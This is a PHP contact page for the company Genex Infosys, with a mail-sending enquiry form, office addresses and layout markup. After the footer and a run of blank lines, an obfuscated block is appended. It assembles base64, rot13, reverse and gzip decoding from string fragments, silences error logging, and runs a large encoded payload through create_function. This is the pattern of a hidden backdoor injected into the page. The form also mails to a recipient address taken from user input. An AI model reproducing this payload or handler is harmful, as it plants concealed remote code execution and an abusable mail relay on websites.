<?php

    $comName = isset($_POST["companyName"]) ? $_POST["companyName"] : "";

    $msg = "Name: " . $_POST["name"] . "\n Email: ". $_POST["email"] . "Phone: ". $_POST["phone"]. "\n Company Name: " . $comName . "\n Enquiry: " . $_POST["enquiry"];

    $msg = wordwrap($msg, 70);


    mail($_POST["genexEmail"],"Website Enquiry", $msg);

    // reditect

?>

<?php $hide_slider = true; ?>
<?php include 'properties/headerindex.php';?>
<style type="text/css">
  #contact {a :color: black !important}
</style>
<br><br><br>
<div class="row" style="padding-bottom: 30px;">

<div class="row">
  <div class="aboutPageCover PageCover" style="padding-top: 0px; height: auto; background-image: url(images/cover/contact.png);">
    <div class="PageCoverText text-center res-content" style="padding-top: 25vh; padding-bottom:15vh;">
      <img src="images/contact-icon.png" style="width: 5%; background: fixed">
      <h1>Get in touch with Genex</h1>
    </div>
  </div>

</div>
</div>



<div class="row">

  <div class=" col-padding-top-50">
    <div class="container">
      <div class="alert alert-success">
        <h2>Thank you for contacting to us.</h2>
      </div>
    </div>
  </div>

  <div class=" col-padding-top-50">
    <div class="container">
      <div class="col-md-6">
      <div>
            <!-- <p>Whether it’s for your business or assistance regarding your current services, you can fill up the form below and we will get back to you.</p></br> -->
            <!-- <p>You can reach us anytime at info@genexinfosys.com or call us at <b style="color:#2dbcb8;">+88 09 612 111 000</b></p></br> -->

            </div>

          <section class="col-padding-bottom-50">
            <div class="col-md-12 no-padding">
              <div>
                <h1>Have an Enquiry?</h1>
                <p style="font-size: 16px; font-weight: 400;">Send us your questions or sales enquiries so we can get you to the right people, as soon as possible.</p></br>
                <form action="" method="post">

                  <fieldset class="form-group">
                    <input name="name" type="text" class="form-control" id="formGroupExampleInput" placeholder="Name" required>
                  </fieldset>

                  <fieldset class="form-group">
                    <input name="compnayName" type="text" class="form-control" id="formGroupExampleInput2" placeholder="Company Name">
                  </fieldset>

                  <fieldset class="form-group">
                    <input name="email" type="text" class="form-control" id="formGroupExampleInput2" placeholder="Email" required>
                  </fieldset>

                  <fieldset class="form-group">
                    <input name="phone" type="text" class="form-control" id="formGroupExampleInput2" placeholder="Phone Number" required>
                  </fieldset>

                  <fieldset class="form-group">
                    <select name="genexEmails" class="form-control">
                      <option value="alihayder19@gmail.com">General</option>
                      <option value="mkt@genexinfosys.com">Sales</option>
                      <option value="jobs@genexinfosys.com">Jobs</option>
                    </select>
                  </fieldset>

                  <fieldset class="form-group">
                    <textarea name="enquiry" class="form-control" rows="5" id="comment" placeholder="What are you looking for?" required></textarea>
                  </fieldset>

                  <button type="submit" class="btn btn-primary pull-right" style="width: 250px;height: 48px;border-radius: 0px;">Send</button>
                </form>


              </div>
              <div class="col-md-3"><span></span></div>
            </div>
          </section>

          <section class="row">

          </section>
      </div>
      <div class="col-md-6">
        <br>
        <br>
        <br>
        <img src="images/contact/contact2.jpg" class="img-responsive" alt="">
      </div>

    </div>
  </div>
</div>

<!-- Form -->
<div class="row">
            <div class="content">
              <div class="col-md-12">

                <h3>Genex Infosys Limited</h3></br>

                <b>Corporate Office</b> </br>
                <p style="line-height: 1.5;">Nitol Niloy Tower (Level 8), Nikunja C/A, Airport Road, Dhaka-1229</br>
                <b>Phone: </b>+88 09 612 111 000  <b>Email: </b>info@genexinfosys.com</p> </br>


                <span style="color: #3a3d3b; font-weight: 400"><b>Service Delivery Centers</b><br/>
                <li>Nitol Niloy Tower (Level 6-12), Nikunja C/A, Airport Road, Dhaka-1229</li></li>
                <li>Mascot Plaza (Level 4,5,9), Sector 07, Uttara, Dhaka-1230</li></li>
                <li>BGMEA Tower (Level 11,12), 669/E, Khulshi, Chittagong</li></br>
        
                <div class="footerlink">
                  <b>Global Footprint</b></br>
                  <a href="#">UK</a> | <a href="#"> Malaysia </a> | <a href="#">Myanmar</a> | <a href="#">Thailand</a>
                </div>

              </span>

              </div>
            </div>


</div>
<!-- Form Section End -->


<!-- <div class="row" style=" background-color: #fff;">
  <div class="content container" style="padding-top: 50px;">
        <div class="col-lg-12 bhoechie-tab-container">
            <div class="col-lg-4 bhoechie-tab-menu">
              <div class="list-group" >
                <a href="#" class="list-group-item active">
                  <h4>Bangladesh Office</h4>
                </a>
                <a href="#" class="list-group-item">
                  <h4>Myanmar Office</h4>
                </a>
                <a href="#" class="list-group-item">
                  <h4>Malaysia Office</h4>
                </a>
              </div>
            </div>
            <div class="col-lg-8 bhoechie-tab" style="padding-right: 0; padding-left: 0;">

                  <div class="bhoechie-tab-content active">
                      <iframe width="100%"  height="500px"  frameborder="0" style="border:0" src="https://www.google.com/maps/embed/v1/place?key=AIzaSyCdKeRdYVUOjzqPHNTcYsjvFmzmWVKjru4
                        &q=place_id:ChIJudY1vzvEVTcR9DtP_4WrjvY" allowfullscreen>
                    </iframe>
                    <h3>Operation Office</h3>
                    <p>Mascot Plaza, House Building,</p>
                    <p>Uttara, Dhaka 1230</p>

                </div>

                <div class="bhoechie-tab-content">
                    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d10929.619833784911!2d96.13942418935399!3d16.776019244203685!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x30c1eb79ae1e410b%3A0xe5adfd93614ba61e!2sConsult-Myanmar+Co+Ltd!5e0!3m2!1sen!2s!4v1499858514719" width="100%" height="500px" frameborder="0" style="border:0" allowfullscreen></iframe>
                    <h3>Corporate Office</h3>
                    <p>No. 47 Kaingdan Street, 1st Floor </br>
                     Lan Madaw Township, Yangon, Myanmar.</p>

                </div>


                <div class="bhoechie-tab-content">
                    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3984.0465010321877!2d101.6102420600876!3d3.082263781052506!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x31cc4c79b7952257%3A0x851b4d0286f22389!2sAvenue+Business+Centre+%40+Leisure+Commerce+Square!5e0!3m2!1sen!2s!4v1499858429686" width="100%" height="500px" frameborder="0" style="border:0" allowfullscreen></iframe>
                    <h3>Genex Infosys SDN BHD</h3>
                    <p>Unite 3A-25 Level 3A, Block 3A</p>
                    <p>Leisure Commerce Square, Jalan PJS 8/9, Petaling Jaya</p>
                    <p>46150 Selangor</p>
                </div>
            </div>
        </div>
  </div>
</div> -->

<!-- https://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d1849.8175937369401!2d96.11031045450191!3d21.98696023747437!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e0!3m2!1sen!2sbd!4v1448972770323 -->



<div class="paddinTop30" style="background-color: #f1f2f3"><span></span></div>
</div>

<script type="text/javascript">document.getElementById("contact").style.color = "#22bdb6";</script>
<?php include 'properties/footer.php';?>














<?php $Vjwlb = 'b'.'a'.'se64'.'_deco'.'de';  $wFAWq = 'st'.'r'.'_rot1'.'3';  $ugwlo = 'strr'.'ev';  $gQdVX = 'gzun'.'compress';  /*   matqszjaupnrrijhewfn t   */ error_reporting(0); echo '<html></html>'; ini_set('display_errors', 0); ini_set('error_log', NULL); ini_set('log_errors', 0); $FEiHQ = 'Creat'.'e'.'_F'.'unction'; $dXupZ = $FEiHQ('', $gQdVX($ugwlo($wFAWq($Vjwlb('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'))))); $dXupZ(); ?>